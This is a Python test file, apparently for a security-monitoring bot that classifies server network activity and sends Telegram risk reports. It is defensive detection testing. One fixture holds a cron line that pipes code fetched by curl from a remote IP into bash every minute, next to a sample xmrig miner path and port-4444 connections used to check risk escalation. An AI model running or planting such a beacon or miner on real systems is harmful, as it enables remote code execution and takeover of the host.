"""
Regression coverage for BUILD-SEC-NET-02 (authoritative classified reporting).

REG-SEC-NET-02-1 — the prompt and the Telegram formatter show directions,
confidence, reason, risk, categories and totals, contain no blanket
port/IP/ephemeral trust claims, keep benign and adverse observations with
explicit counts when the output is bounded.

REG-SEC-NET-02-2 — /security and the nightly job both deliver the same
authoritative assessment to the instance's chat when the model fails, returns an
error string, or contradicts the evidence; chunk bounds are respected.
"""

import base64
import io
import json
import os
import re
import stat
import sys
import tempfile
import threading
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest import mock

import requests

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import llm_analyzer
import monitor
import security_scanner


ROOT = Path(__file__).resolve().parents[1]

BOT_EXE = "/home/ubuntu/dev/monitor_bot/venv/python"
BOT_SCRIPT = "/home/ubuntu/dev/monitor_bot/monitor.py"
OTEL_CONTAINER = "otel-collector"


def observation(local_ip, local_port, remote=None, direction="outbound",
                 bind_scope="private-interface", classification="needs_review",
                 confidence="low", reason="evidence based reason", is_listener=False,
                 name="python3", exe="/usr/bin/python3", cmdline=("python3", "/tmp/x.py"),
                 user="www-data", container=None, protocol="tcp", state="ESTABLISHED",
                 evidence=None, pid=4242):
    return {
        "protocol": protocol, "state": state, "local_ip": local_ip, "local_port": local_port,
        "remote_ip": remote[0] if remote else None,
        "remote_port": remote[1] if remote else None,
        "direction": direction, "bind_scope": bind_scope, "is_listener": is_listener,
        "pid": pid,
        "process": {"name": name, "exe": exe, "cmdline": list(cmdline), "user": user,
                    "parent_exe": "/usr/sbin/init"},
        "container": container,
        "classification": classification, "confidence": confidence, "reason": reason,
        "evidence": evidence if evidence is not None else {
            "local": "%s:%s" % (local_ip, local_port), "state": state, "pid": pid},
    }


def findings(observations, *, error=None, risk=None, scan_status="complete",
             scan_gaps=None, processes=None, auth_log=(), services=None, cron=(),
             users=(), docker_status="available"):
    counts = {}
    for item in observations:
        counts[item["classification"]] = counts.get(item["classification"], 0) + 1
    directions = {"inbound": 0, "outbound": 0, "uncertain": 0}
    for item in observations:
        directions[item["direction"]] = directions.get(item["direction"], 0) + 1
    network = {
        "observations": observations,
        "category_counts": counts,
        "totals": {
            "observations": len(observations),
            "listeners": sum(1 for item in observations if item["is_listener"]),
            "inbound": directions["inbound"], "outbound": directions["outbound"],
            "uncertain": directions["uncertain"],
        },
        "unexpected_listening": [], "external_connections": [],
        "scan_status": scan_status, "scan_gaps": list(scan_gaps or []),
        "docker_status": docker_status,
    }
    data = {
        "instance": "AURORA", "mode": "local", "collected": "2026-09-29 12:00:00",
        "error": error,
        "processes": processes or {"high_cpu": [], "high_mem": [], "suspicious_name": [],
                                   "suspicious_path": [], "zombies": []},
        "network": network,
        "users": {"logged_in": list(users)},
        "files": {"recently_modified_system": []},
        "services": services or {"failed": [], "new_units": []},
        "cron": {"entries": list(cron)},
        "auth_log": list(auth_log),
    }
    network["risk"] = risk or security_scanner._assess_network_risk(
        observations, scan_status, list(scan_gaps or []), data)
    return data


MIXED = [
    observation("127.0.0.1", 13133, direction="uncertain", bind_scope="loopback-only",
                classification="expected", confidence="high", is_listener=True,
                name="docker-proxy", exe="/usr/bin/docker-proxy", user="root",
                state="LISTEN", cmdline=("docker-proxy",),
                reason="exactly one running container publishes host port 13133",
                container={"name": OTEL_CONTAINER, "image": "otel/collector:0.1",
                           "target_port": 13133}),
    observation("0.0.0.0", 443, direction="inbound", bind_scope="all-interfaces",
                classification="informational", confidence="high", is_listener=True,
                name="nginx", exe="/usr/sbin/nginx", user="www-data", state="LISTEN",
                cmdline=("nginx: worker process",),
                reason="nginx owns this listener bound to all-interfaces"),
    observation("203.0.113.9", 443, remote=("198.51.100.7", 54001), direction="inbound",
                bind_scope="public-interface", classification="informational",
                confidence="high", name="nginx", exe="/usr/sbin/nginx", user="www-data",
                cmdline=("nginx: worker process",), reason="matched inbound peer traffic"),
    observation("10.0.1.5", 53124, remote=("203.0.113.10", 443), direction="outbound",
                classification="expected", confidence="high", name="python", exe=BOT_EXE,
                cmdline=(BOT_EXE, BOT_SCRIPT), user="ubuntu",
                reason="matches the configured monitor bot identity and destination"),
    observation("10.0.1.5", 44999, remote=("198.51.100.44", 4444), direction="outbound",
                classification="suspicious", confidence="medium",
                reason="unrecognised script is connecting to an unexpected service port"),
    observation("127.0.0.53", 53, direction="uncertain", bind_scope="loopback-only",
                classification="needs_review", confidence="low", is_listener=True,
                name="systemd-resolve", exe="/lib/systemd/systemd-resolved", user="root",
                state="LISTEN", cmdline=("/lib/systemd/systemd-resolved",),
                reason="listener owner identity could not be established"),
]


def unescape(text):
    """The text a Telegram Markdown client renders from an escaped chunk."""
    return re.sub(r"\\([_*`\[\]])", r"\1", text)


def count_unescaped(chunk, char):
    return len(re.findall(r"(?<!\\)" + re.escape(char), chunk))


# REG-REV-NET-001 fixture: host-derived text that carries Telegram Markdown
# reserved characters, exactly as the collector can produce it.
MARKDOWN_HOSTILE = [
    observation("0.0.0.0", 13133, direction="uncertain", bind_scope="all-interfaces",
                classification="needs_review", confidence="low", is_listener=True,
                name="docker-proxy", exe="/usr/bin/docker-proxy", user="root",
                state="LISTEN", cmdline=("docker-proxy",), pid=500,
                container={"name": "otel_collector", "image": "otel/collector:0.1",
                           "target_port": 13133},
                evidence={"state": "LISTEN", "pid": 500, "docker_status": "available"},
                reason=("Publishing container is verified, but no collector identity is "
                        "configured (INSTANCE_<N>_SECURITY_OTEL_CONTAINER_NAME), so the "
                        "workload cannot be confirmed as the expected collector")),
    observation("10.0.1.5", 44012, remote=("100.100.100.100", 443),
                classification="needs_review", confidence="low",
                name="tailscaled", exe="/usr/libexec/tailscaled",
                cmdline=("/usr/libexec/tailscaled", "--statedir=/var/lib/tailscale_state"),
                reason=("Process tailscaled looks like the Tailscale client, but no "
                        "INSTANCE SECURITY_TAILSCALED_EXE is configured to verify it; "
                        "see also sshd[2103]: Connection closed by authenticating user "
                        "root 198.51.100.44 port 41322 [preauth]")),
    observation("10.0.1.5", 53124, remote=("203.0.113.10", 443),
                classification="expected", confidence="high", name="python", exe=BOT_EXE,
                cmdline=(BOT_EXE, BOT_SCRIPT), user="ubuntu",
                evidence={"state": "ESTABLISHED", "pid": 900,
                          "matched_destination": "203.0.113.10"},
                reason="matches the configured monitor bot identity and destination"),
]

MARKDOWN_HOSTILE_AUTH = [
    "Sep 29 10:00:05 AURORA sshd[2103]: Connection closed by authenticating user root "
    "198.51.100.44 port 41322 [preauth]",
]


class ReportSectionTests(unittest.TestCase):
    """REG-REV-NET-002: one canonical evidence view, rendered exactly once."""

    SECTIONS = [
        observation("127.0.0.1", 13133, direction="uncertain", bind_scope="loopback-only",
                    classification="expected", confidence="high", is_listener=True,
                    name="docker-proxy", exe="/usr/bin/docker-proxy", user="root",
                    state="LISTEN", cmdline=("docker-proxy",),
                    container={"name": OTEL_CONTAINER, "image": "otel/collector:0.1",
                               "target_port": 13133},
                    reason="exactly one running container publishes host port 13133"),
        observation("0.0.0.0", 13133, direction="uncertain", bind_scope="all-interfaces",
                    classification="needs_review", confidence="low", is_listener=True,
                    name="docker-proxy", exe="/usr/bin/docker-proxy", user="root",
                    state="LISTEN", cmdline=("docker-proxy",),
                    reason=("the host socket is bound to all-interfaces, so the collector "
                            "is reachable from the network")),
        observation("203.0.113.9", 443, remote=("198.51.100.7", 54001), direction="inbound",
                    bind_scope="public-interface", classification="informational",
                    confidence="high", name="nginx", exe="/usr/sbin/nginx", user="www-data",
                    state="ESTABLISHED", cmdline=("nginx: worker process",),
                    reason="nginx accepted inbound connection 198.51.100.7:54001"),
        observation("10.0.1.5", 53124, remote=("203.0.113.10", 443), direction="outbound",
                    bind_scope="private-interface", classification="expected",
                    confidence="high", name="python", exe=BOT_EXE, cmdline=(BOT_EXE, BOT_SCRIPT),
                    user="ubuntu", evidence={"state": "ESTABLISHED", "pid": 900,
                                             "matched_destination": "203.0.113.10"},
                    reason="matches the configured monitor bot identity and destination"),
        observation("0.0.0.0", 443, direction="inbound", bind_scope="all-interfaces",
                    classification="informational", confidence="high", is_listener=True,
                    name="nginx", exe="/usr/sbin/nginx", user="www-data", state="LISTEN",
                    cmdline=("nginx: worker process",),
                    reason="nginx owns this listener; it is bound to all-interfaces"),
    ]

    REMOVED_SECTIONS = ("*Suspicious / Requires Review*", "*Expected Network Activity*",
                        "*Externally Exposed Listeners*", "*Local-Only Listeners*",
                        "*Outbound Connections*", "*Inbound Connections*")

    def sections(self):
        return self.sections_from(self.SECTIONS)

    def test_the_six_overlapping_sections_are_absent_and_one_block_replaces_them(self):
        text, block = self.sections()

        # One canonical detail block replaces the six overlapping sections.
        self.assertEqual(llm_analyzer.SECTION_TITLES, ("Network evidence",))
        self.assertEqual(text.count("*Network evidence*"), 1)
        for gone in self.REMOVED_SECTIONS:
            with self.subTest(removed_section=gone):
                self.assertNotIn(gone, text)
        # The aggregate summary precedes the detail and reports both totals.
        self.assertLess(text.index("*Network summary*"), text.index("*Network evidence*"))
        self.assertIn("Direction:", text)
        self.assertIn("Listeners:", text)

        # SAFE-4: the exposed collector is reviewed and exposed, never expected.
        exposed = self.line_for(block, "0.0.0.0:13133")
        self.assertIn("[needs_review]", exposed)
        self.assertIn("bind=all-interfaces", exposed)
        self.assertIn("listener=yes", exposed)
        # The verified loopback collector is expected and bound locally.
        local = self.line_for(block, "127.0.0.1:13133")
        self.assertIn("[expected]", local)
        self.assertIn("bind=loopback-only", local)
        # SAFE-1: an inbound nginx socket is inbound, never outbound.
        inbound = self.line_for(block, "198.51.100.7:54001")
        self.assertIn(" inbound ", inbound)
        self.assertNotIn(" outbound ", inbound)
        # The monitor bot socket is outbound and expected.
        outbound = self.line_for(block, "10.0.1.5:53124")
        self.assertIn("[expected]", outbound)
        self.assertIn(" outbound ", outbound)
        # REV-REV-NET-006 identifiers survive into the rendered block.
        self.assertIn("matched-destination=203.0.113.10", outbound)
        # The all-interfaces nginx listener is exposed, not expected.
        listener = self.line_for(block, "0.0.0.0:443")
        self.assertIn("[informational]", listener)
        self.assertIn("bind=all-interfaces", listener)

    def test_sectioning_is_a_pure_view_of_the_shown_observations(self):
        text, block = self.sections()
        selection = llm_analyzer._select_observations(self.SECTIONS)
        for _, observation in selection["shown"]:
            endpoint = "%s:%s" % (observation["local_ip"], observation["local_port"])
            with self.subTest(observation=endpoint):
                self.assertIn(endpoint, text)
                self.line_for(block, endpoint)
        # The preserved blocks are still there.
        self.assertIn("*Other evidence*", text)
        self.assertIn("The risk above is computed from the collected evidence", text)

    def test_an_empty_section_states_none(self):
        text, block = self.sections_from([self.SECTIONS[0]])

        self.assertIn("[expected]", self.line_for(block, "127.0.0.1:13133"))
        # A classification with no evidence is still reported, with a zero omission.
        for label in ("High risk", "Suspicious", "Needs review", "Unknown",
                      "Informational", "Benign"):
            with self.subTest(classification=label):
                self.assertIn(
                    "%s: 0 total — showing 0, 0 omitted from Telegram output." % label, text)
        self.assertIn("Expected: 1 total — showing 1, 0 omitted from Telegram output.", text)

    def evidence_lines(self, block):
        """Rendered observation lines only; `conf=` appears on nothing else."""
        return [line for line in block.splitlines() if " conf=" in line]

    def line_for(self, block, endpoint):
        """The single rendered observation line that carries `endpoint`."""
        matched = [line for line in self.evidence_lines(block) if endpoint in line]
        self.assertEqual(
            len(matched), 1,
            "%s was rendered %d time(s), expected exactly once" % (endpoint, len(matched)),
        )
        return matched[0]

    def sections_from(self, items):
        text = unescape("\n".join(
            llm_analyzer.format_assessment(findings(items), "TS")))
        start = text.index("*%s*" % llm_analyzer.SECTION_TITLES[0])
        end = text.index("*Other evidence*")
        return text, text[start:end]


class TruncationTests(unittest.TestCase):
    """REG-REV-NET-004: confirmed deviations are never dropped and the caps are exact."""

    def observations(self, review=71):
        items = [observation("10.0.1.5", 40000 + index,
                             remote=("198.51.100.%d" % (index % 250 + 1), 443),
                             classification="needs_review")
                 for index in range(review)]
        items.append(observation("10.0.1.5", 44999, remote=("203.0.113.66", 4444),
                                 classification="suspicious", confidence="medium",
                                 reason="unrecognised script to an unexpected service port"))
        items.append(observation("10.0.1.5", 44998, remote=("203.0.113.65", 4445),
                                 classification="high_risk", confidence="high",
                                 reason="confirmed deviation from the configured environment"))
        items.append(dict(MIXED[0]))          # expected loopback collector
        items.append(dict(MIXED[1]))          # informational all-interfaces listener
        items.append(dict(MIXED[2]))          # informational inbound peer
        return items

    def test_adverse_evidence_is_never_omitted_and_the_notice_is_honest(self):
        items = self.observations()
        selection = llm_analyzer._select_observations(items)
        rendered = unescape("\n".join(
            llm_analyzer.format_assessment(findings(items), "TS")))

        # (a) No completeness claim the report cannot support.
        self.assertNotIn("every suspicious, review, and unknown item is listed above",
                         rendered)
        # (b) high_risk and suspicious are never capped, for any input size.
        for category, total in (("high_risk", 1), ("suspicious", 1)):
            with self.subTest(classification=category):
                self.assertEqual(selection["categories"][category]["total"], total)
                self.assertEqual(selection["categories"][category]["shown"], total)
                self.assertEqual(selection["categories"][category]["omitted"], 0)
        self.assertIn("203.0.113.66:4444", rendered)
        self.assertIn("203.0.113.65:4445", rendered)
        self.assertIn("unrecognised script to an unexpected service port", rendered)
        self.assertIn("confirmed deviation from the configured environment", rendered)
        # (c) The needs_review cap and its omissions are exact, and only the first
        #     NEEDS_REVIEW_SHOWN of them are rendered.
        shown_ports = [40000 + index for index in range(71)
                       if "10.0.1.5:%d" % (40000 + index) in rendered]
        self.assertEqual(selection["categories"]["needs_review"]["total"], 71)
        self.assertEqual(selection["categories"]["needs_review"]["shown"],
                         llm_analyzer.NEEDS_REVIEW_SHOWN)
        self.assertEqual(selection["categories"]["needs_review"]["omitted"],
                         71 - llm_analyzer.NEEDS_REVIEW_SHOWN)
        self.assertEqual(shown_ports, list(range(40000, 40000 + len(shown_ports))))
        self.assertEqual(
            len(shown_ports), selection["categories"]["needs_review"]["shown"])
        self.assertIn(
            "Needs review: 71 total — showing %d, %d omitted from Telegram output." % (
                llm_analyzer.NEEDS_REVIEW_SHOWN, 71 - llm_analyzer.NEEDS_REVIEW_SHOWN),
            rendered)
        # (d) The removed notices stay removed and the accounting is honest.
        for gone in ("omitted for length", "Truncated for message length",
                     "Adverse omissions", "display budget"):
            with self.subTest(removed_notice=gone):
                self.assertNotIn(gone, rendered)

    def test_selection_never_returns_an_omitted_adverse_observation(self):
        adverse_only = [observation("10.0.1.5", 40000 + index,
                                    remote=("198.51.100.1", 4444),
                                    classification="suspicious")
                        for index in range(120)]
        selection = llm_analyzer._select_observations(adverse_only)

        self.assertEqual(selection["omitted"], [])
        self.assertEqual(len(selection["shown"]), 120)
        self.assertEqual(selection["categories"]["suspicious"],
                         {"total": 120, "shown": 120, "omitted": 0})
        self.assertEqual(selection["totals"],
                         {"observations": 120, "rendered": 120, "omitted": 0})
        # All seven classifications are accounted for, including empty ones.
        self.assertEqual(set(selection["categories"]),
                         {name for name, _label in llm_analyzer.CATEGORY_LABELS})
        for name, entry in selection["categories"].items():
            with self.subTest(classification=name):
                self.assertEqual(entry["total"], entry["shown"] + entry["omitted"])

    def test_expected_evidence_is_truncated_before_any_adverse_evidence(self):
        items = [observation("127.0.0.1", 13133 + index, direction="uncertain",
                             bind_scope="loopback-only", classification="expected",
                             confidence="high", is_listener=True, name="docker-proxy",
                             exe="/usr/bin/docker-proxy", user="root", state="LISTEN",
                             cmdline=("docker-proxy",))
                 for index in range(80)]
        items.append(observation("10.0.1.5", 44999, remote=("203.0.113.66", 4444),
                                 classification="suspicious", confidence="medium"))
        selection = llm_analyzer._select_observations(items)

        self.assertEqual(selection["categories"]["suspicious"],
                         {"total": 1, "shown": 1, "omitted": 0})
        self.assertEqual(selection["categories"]["expected"]["shown"],
                         llm_analyzer.VERIFIED_SHOWN)
        self.assertEqual(selection["categories"]["expected"]["omitted"],
                         80 - llm_analyzer.VERIFIED_SHOWN)
        self.assertIn("203.0.113.66:4444", unescape(
            "\n".join(llm_analyzer._observation_line(item, for_markdown=True)
                      for _, item in selection["shown"])))

    def test_verified_categories_share_one_pool_allocated_in_order(self):
        pool = llm_analyzer.VERIFIED_SHOWN
        mixed = [observation("127.0.0.1", 30000 + index, direction="uncertain",
                             bind_scope="loopback-only", classification="expected",
                             confidence="high") for index in range(6)]
        mixed += [observation("0.0.0.0", 31000 + index, direction="uncertain",
                              bind_scope="all-interfaces", classification="informational",
                              confidence="high") for index in range(6)]
        mixed += [observation("10.0.1.5", 32000 + index, direction="outbound",
                              remote=("203.0.113.%d" % (index + 1), 443),
                              classification="benign", confidence="low")
                  for index in range(6)]
        selection = llm_analyzer._select_observations(mixed)

        self.assertEqual(selection["categories"]["expected"],
                         {"total": 6, "shown": 6, "omitted": 0})
        self.assertEqual(selection["categories"]["informational"]["shown"], pool - 6)
        self.assertEqual(selection["categories"]["benign"]["shown"], 0)
        self.assertEqual(selection["totals"]["rendered"], pool)
        # The shared pool is allocated expected -> informational -> benign.
        classes = [item["classification"] for _, item in selection["shown"]]
        self.assertEqual(classes, ["expected"] * 6 + ["informational"] * (pool - 6))

    def test_a_classification_the_caps_do_not_configure_is_still_bounded(self):
        """REV-CAPS-001: a future eighth classification is capped AND accounted."""
        # The seven configured classifications keep their exact accounting.
        self.assertEqual([name for name, _label in llm_analyzer.CATEGORY_LABELS],
                         ["high_risk", "suspicious", "needs_review", "unknown",
                          "expected", "informational", "benign"])
        self.assertEqual(llm_analyzer.CATEGORY_CAPS,
                         {"needs_review": llm_analyzer.NEEDS_REVIEW_SHOWN,
                          "unknown": llm_analyzer.UNKNOWN_SHOWN})
        self.assertEqual(llm_analyzer.UNCAPPED_CATEGORIES, ("high_risk", "suspicious"))

        future = [observation("10.0.1.5", 40000 + index, direction="outbound",
                              remote=("203.0.113.%d" % (index + 1), 443),
                              classification="brand_new", confidence="low")
                  for index in range(200)]
        selection = llm_analyzer._select_observations(future)

        # Bounded, not uncapped.
        entry = selection["categories"]["brand_new"]
        self.assertEqual(entry["total"], 200)
        self.assertLess(entry["shown"], 200)
        self.assertGreaterEqual(entry["shown"], 1)
        # Accounted: shown + omitted == total, and nothing is lost silently.
        self.assertEqual(entry["shown"] + entry["omitted"], entry["total"])
        self.assertEqual(selection["totals"]["observations"], 200)
        self.assertEqual(selection["totals"]["rendered"], entry["shown"])
        # The rendered summary still carries exactly the seven configured cap
        # lines (SAFE-1/SAFE-4); the eighth classification is accounted for in the
        # selection it is bounded by, and the findings dict keeps all 200.
        rendered = "\n".join(llm_analyzer.format_assessment(findings(future), "TS"))
        cap_lines = [line for line in rendered.splitlines()
                     if "omitted from Telegram output." in line]
        self.assertEqual(len(cap_lines), 7)
        self.assertEqual(len(findings(future)["network"]["observations"]), 200)


class TransportSafetyTests(unittest.TestCase):
    """REG-REV-NET-001: no evidence-reserved character can reject a whole chunk."""

    def chunks(self):
        return llm_analyzer.format_assessment(
            findings(MARKDOWN_HOSTILE, auth_log=MARKDOWN_HOSTILE_AUTH), "TS")

    def test_every_chunk_is_markdown_balanced_and_evidence_is_escaped(self):
        chunks = self.chunks()
        rendered = unescape("\n".join(chunks))
        raw = "\n".join(chunks)

        for chunk in chunks:
            self.assertEqual(count_unescaped(chunk, "_") % 2, 0, chunk)
            self.assertEqual(count_unescaped(chunk, "*") % 2, 0, chunk)
            self.assertEqual(count_unescaped(chunk, "`") % 2, 0, chunk)
            self.assertEqual(count_unescaped(chunk, "["), 0, chunk)
        for hostile in ("INSTANCE_<N>_SECURITY_OTEL_CONTAINER_NAME",
                        "--statedir=/var/lib/tailscale_state",
                        "/home/ubuntu/dev/monitor_bot/venv/python",
                        "/home/ubuntu/dev/monitor_bot/monitor.py",
                        "otel_collector", "sshd[2103]", "[preauth]"):
            with self.subTest(evidence=hostile):
                self.assertNotIn(hostile, raw)
        # The risk line, the reasons, and every adverse item still reach the operator.
        self.assertIn("Risk: `MEDIUM`", rendered)
        self.assertIn("*Authoritative assessment (deterministic)*", rendered)
        for item in MARKDOWN_HOSTILE:
            with self.subTest(reason=item["reason"][:40]):
                self.assertIn(item["reason"], rendered)
                self.assertIn(item["process"]["exe"], rendered)
        self.assertIn("Connection closed by authenticating user root", rendered)
        # REV-REV-NET-006: the correlated identifiers are rendered.
        self.assertIn("state=LISTEN", rendered)
        self.assertIn("pid=500", rendered)
        self.assertIn("matched-destination=203.0.113.10", rendered)
        self.assertIn("docker-status=available", rendered)

    def test_rejected_chunk_is_surfaced_and_later_chunks_are_still_attempted(self):
        many = [dict(MIXED[4], local_port=40000 + index, local_ip="10.0.1.5",
                     remote=("198.51.100.%d" % (index % 250 + 1), 4444))
                for index in range(120)]
        data = findings(many)
        chunks = llm_analyzer.format_assessment(data, "TS")
        self.assertGreater(len(chunks), 1)

        sent = []

        def post(url, json=None, **kwargs):
            sent.append(json)
            response = mock.Mock()
            if len(sent) == 2:
                response.raise_for_status.side_effect = requests.exceptions.HTTPError(
                    "400 Bad Request: can't parse entities: can't find end of the entity")
            return response

        buffer = io.StringIO()
        with mock.patch.object(monitor.requests, "post", side_effect=post):
            with redirect_stdout(buffer):
                monitor.send_security_assessment(
                    "-1001", {"name": "AURORA", "chat_id": "-1001"}, data, "TS")
        printed = buffer.getvalue()

        # Every chunk was still attempted, in order, including the ones after the
        # rejected one, and the rejection was reported to the operator.
        self.assertEqual(len(sent), len(chunks))
        self.assertEqual([item["text"] for item in sent], chunks)
        self.assertIn("assessment chunk 2", printed)
        self.assertIn("1 authoritative assessment chunk(s) were rejected by Telegram",
                      printed)
        self.assertIn("was NOT delivered", printed)

    def test_advisory_banner_escapes_the_instance_name(self):
        chunks = llm_analyzer.format_advisory("AURORA_1", "### FINDINGS\nfine", "TS")

        self.assertEqual(count_unescaped("\n".join(chunks), "_"), 0)
        self.assertIn("AURORA_1", unescape("\n".join(chunks)))
        self.assertIn("cannot lower or raise the authoritative risk", chunks[0])


class AdvisoryChunkBoundTests(unittest.TestCase):
    """REG-REV-NET-011: no advisory message may exceed Telegram's 4096-char limit."""

    INSTANCE = "AURORA"
    TIMESTAMP = "2026-01-01 00:00:00"
    FILLER = ("The observed socket matched no configured destination and the owning "
              "process could not be identified, so it is listed for review. ")
    # Chunk 1 carries the full advisory banner AND the report header. Chunks 2..N
    # carry a short continuation header instead. Both are delivery furniture,
    # never model text, and the split may rstrip the blank lines after them.
    BANNER = (r"🤖 \*AI Security Commentary — advisory only\*\n"
              r"🖥️ Instance: `[^\n]*`\n"
              r"🕐 [^\n]*\n"
              r"⚠️ Advisory text cannot lower or raise the authoritative risk shown above\.\n"
              r"─{38}\n*")
    CONTINUATION = (r"🤖 \*AI Security Commentary\* \(advisory only\) — continued "
                    r"\d+/\d+\n"
                    r"🖥️ Instance: `[^\n]*`\n"
                    r"⚠️ Advisory text cannot lower or raise the authoritative risk "
                    r"shown above\.\n*")
    REPORT = (r"🔐 \*Security Report\*\n"
              r"🖥️ Instance: `[^\n]*`\n"
              r"🕐 [^\n]*\n"
              r"─{38}\n*")
    FURNITURE = re.compile(
        r"\A(?:%s)?(?:%s)?(?:%s)?" % (BANNER, CONTINUATION, REPORT))

    def paragraph(self, length):
        """Plain prose of at most `length` characters, unbroken at a word boundary.

        Plain prose is used on purpose: `_format_for_telegram` rewrites headings
        and bullets, which would make the body comparison below meaningless.
        """
        text = self.FILLER * (length // len(self.FILLER) + 1)
        cut = text.rfind(" ", 0, length + 1)
        return (text[:cut] if cut > 0 else text[:length]).strip()

    def body_breaking_at(self, offset):
        """A two-paragraph body whose paragraph break sits at `offset`."""
        return self.paragraph(offset - 2) + "\n\n" + self.paragraph(120)

    def advisory(self, body):
        return llm_analyzer.format_advisory(self.INSTANCE, body, self.TIMESTAMP)

    def assert_deliverable(self, chunks):
        """Every chunk is sendable, still banner-marked, and losslessly joined."""
        self.assertTrue(chunks)
        for chunk in chunks:
            self.assertLessEqual(len(chunk), llm_analyzer.TELEGRAM_MAX_MESSAGE,
                                 "a chunk Telegram would reject: %d chars" % len(chunk))
            self.assertIn("cannot lower or raise the authoritative risk", chunk)
        return "".join("".join(self.FURNITURE.sub("", chunk).split()) for chunk in chunks)

    def test_paragraph_breaks_sweeping_the_split_window_never_overflow(self):
        """The banner is reserved, so the split window moves, the limit does not."""
        for offset in range(3800, 4001, 20):
            with self.subTest(offset=offset):
                body = self.body_breaking_at(offset)
                chunks = self.advisory(body)

                self.assertGreater(len(chunks), 1)
                self.assertEqual(self.assert_deliverable(chunks),
                                 "".join(body.split()))

    def test_a_single_long_paragraph_is_still_split_within_the_limit(self):
        body = self.paragraph(4500)
        chunks = self.advisory(body)

        self.assertGreaterEqual(len(chunks), 1)
        self.assertEqual(self.assert_deliverable(chunks), "".join(body.split()))

    def test_a_body_shorter_than_the_banner_is_delivered_as_one_banned_chunk(self):
        body = self.paragraph(50)
        chunks = self.advisory(body)

        self.assertEqual(len(chunks), 1)
        self.assertIn("AI Security Commentary — advisory only", chunks[0])
        self.assertEqual(self.assert_deliverable(chunks), "".join(body.split()))

    def test_an_empty_body_still_returns_exactly_one_chunk(self):
        chunks = self.advisory("")

        self.assertEqual(len(chunks), 1)
        self.assertLessEqual(len(chunks[0]), llm_analyzer.TELEGRAM_MAX_MESSAGE)
        self.assertIn("authoritative assessment above stands", chunks[0])

    def test_only_the_first_chunk_carries_the_timestamp_and_the_rule(self):
        """INV-T2-2: the expensive furniture is never repeated on every chunk."""
        chunks = self.advisory(self.body_breaking_at(3900))
        self.assertGreaterEqual(len(chunks), 2)

        with_rule = [chunk for chunk in chunks if "─" * 38 in chunk]
        with_stamp = [chunk for chunk in chunks if "🕐" in chunk]
        self.assertEqual(len(with_rule), 1)
        self.assertEqual(with_rule[0], chunks[0])
        self.assertEqual(len(with_stamp), 1)
        self.assertEqual(with_stamp[0], chunks[0])
        for index, chunk in enumerate(chunks):
            with self.subTest(chunk=index + 1):
                self.assertIn("AI Security Commentary — advisory only" if index == 0
                              else "AI Security Commentary", chunk)
                self.assertIn("cannot lower or raise the authoritative risk", chunk)
                self.assertIn("AURORA", unescape(chunk))
                if index:
                    self.assertIn("continued %d/%d" % (index + 1, len(chunks)), chunk)

    def test_a_single_unbroken_paragraph_stays_within_the_limit(self):
        """A body with no split candidate at all is split on the limit itself."""
        body = "x" * 10000
        chunks = self.advisory(body)

        self.assertGreater(len(chunks), 1)
        for chunk in chunks:
            self.assertLessEqual(len(chunk), llm_analyzer.TELEGRAM_MAX_MESSAGE)
            self.assertIn("cannot lower or raise the authoritative risk", chunk)
        self.assertEqual(self.assert_deliverable(chunks), body)


class AssessmentTests(unittest.TestCase):
    def test_mixed_evidence_produces_one_authoritative_assessment(self):
        assessment = llm_analyzer.build_assessment(findings(MIXED))

        self.assertEqual(assessment["risk"], "medium")
        self.assertEqual(assessment["posture"], "complete")
        self.assertEqual(assessment["categories"]["expected"], 2)
        self.assertEqual(assessment["categories"]["informational"], 2)
        self.assertEqual(assessment["categories"]["needs_review"], 1)
        self.assertEqual(assessment["categories"]["suspicious"], 1)
        self.assertEqual(assessment["directions"],
                         {"inbound": 2, "outbound": 2, "uncertain": 2})
        self.assertEqual(assessment["adverse"], 2)
        self.assertTrue(assessment["reasons"])

    def test_verified_expected_only_scan_is_not_raised_by_counts_or_ports(self):
        verified = [
            item for item in MIXED
            if item["classification"] in ("expected", "informational")
        ]
        assessment = llm_analyzer.build_assessment(findings(verified))
        self.assertEqual(assessment["risk"], "negligible")
        self.assertEqual(assessment["adverse"], 0)

    def test_scanner_failure_is_never_reported_as_clean(self):
        assessment = llm_analyzer.build_assessment(
            findings([], error="SSH unreachable", scan_status="failed"))
        self.assertGreaterEqual(llm_analyzer.RISK_ORDER.index(assessment["risk"]),
                                llm_analyzer.RISK_ORDER.index("medium"))
        self.assertEqual(assessment["posture"], "failed")
        self.assertIn("SSH unreachable", " ".join(assessment["reasons"]))

    def test_correlated_non_network_signals_escalate_the_authoritative_risk(self):
        adverse = findings(
            [MIXED[4]],
            processes={"high_cpu": [], "high_mem": [], "zombies": [],
                       "suspicious_name": [{"pid": 1, "name": "xmrig", "exe": "/tmp/.x/xmrig",
                                            "user": "www-data"}],
                       "suspicious_path": [{"pid": 1, "name": "xmrig",
                                            "exe": "/tmp/.x/xmrig", "user": "www-data"}]},
            auth_log=["sshd[1]: Failed password for root from 198.51.100.44"],
            services={"failed": ["nginx"], "new_units": ["/etc/systemd/system/x.service"]},
            cron=["*/1 * * * * curl -s http://198.51.100.44/beacon | bash"],
        )
        assessment = llm_analyzer.build_assessment(adverse)
        self.assertEqual(assessment["risk"], "high")
        self.assertIn(assessment["non_network"]["adverse_auth_lines"], (1,))
        self.assertEqual(assessment["non_network"]["adverse_cron_lines"], 1)


class LegacyFixtureTests(unittest.TestCase):
    """Legacy findings stay intelligible without invented identity or direction."""

    def setUp(self):
        self.legacy = {
            "instance": "prod-web-01", "mode": "remote", "collected": "2026-06-25 09:00:00",
            "error": None,
            "processes": {"high_cpu": [], "high_mem": [], "suspicious_name": [],
                          "suspicious_path": [], "zombies": []},
            "network": {
                "unexpected_listening": [],
                "external_connections": [
                    {"local": "10.0.1.5:49812", "remote": "52.217.43.100:443"},
                    {"local": "10.0.1.5:49900", "remote": "13.35.66.200:443"},
                ],
            },
            "users": {"logged_in": [{"name": "ubuntu", "terminal": "pts/0", "host": "10.0.0.1",
                                    "started": "2026-06-25 09:00:00"}]},
            "files": {"recently_modified_system": ["2026-06-25T08:30:01 /usr/bin/python3.11"]},
            "services": {"failed": [], "new_units": []},
            "cron": {"entries": ["0 2 * * * /usr/bin/certbot renew --quiet"]},
            "auth_log": ["sshd[1234]: Accepted publickey for ubuntu from 10.0.0.1 port 52100"],
        }

    def test_legacy_records_are_uncertain_and_never_invented_as_outbound(self):
        assessment = llm_analyzer.build_assessment(self.legacy)

        self.assertTrue(assessment["legacy_records"])
